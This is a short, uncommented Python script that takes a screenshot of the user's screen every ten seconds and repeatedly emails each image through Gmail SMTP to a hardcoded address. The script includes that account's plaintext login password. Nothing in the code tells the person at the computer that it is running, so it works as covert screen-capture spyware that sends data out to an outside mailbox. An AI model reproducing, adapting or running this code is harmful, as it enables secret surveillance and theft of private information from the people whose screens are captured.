import numpy as np
import pyautogui
import imutils
import cv2
from email.mime.image import MIMEImage
import smtplib, ssl, email
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders
import threading
import time
import os

try:
    try:
        os.mkdir(r"C:\course")
    except FileExistsError:
        pass
except FileNotFoundError:
    try:
        os.mkdir(r"D:\course")
    except FileExistsError:
        pass
def ss():
    myScreenshot = pyautogui.screenshot()
    try:
        myScreenshot.save(r'C:\course\in_memory_to_disk.png')
    except FileNotFoundError:
        myScreenshot.save(r'D:\course\in_memory_to_disk.png')
    time.sleep(10)
    ss()

def aaa():
    sender_email = "gercekd8@gmail.com"
    receiver_email = "gercekd8@gmail.com"
    subject = "Dosya hazır!"
    port = 465  
    password = "SarpDildo1"

    msg = MIMEMultipart()
    msg["From"] = sender_email
    msg["To"] = receiver_email
    msg["Subject"] = subject
    msg["Bcc"] = receiver_email

    body = "Dosya hazır!"

    msg.attach(MIMEText(body, 'plain'))

    filename = "in_memory_to_disk.png"

    try:
        attachment = open(r"C:\course\in_memory_to_disk.png", 'rb').read()
    except FileNotFoundError:
        attachment = open(r"D:\course\in_memory_to_disk.png", 'rb').read()


    image = MIMEImage(attachment, name=os.path.basename("in_memory_to_disk.png"))
    msg.attach(image)

    context = ssl.create_default_context()

    text = msg.as_string()

    with smtplib.SMTP_SSL("smtp.gmail.com", port, context=context) as server:
        server.login("gercekd8@gmail.com", password)
        server.sendmail(sender_email, receiver_email, text)
        time.sleep(10)
        aaa()

t1 = threading.Thread(target=ss)
t1.start()

aaa()

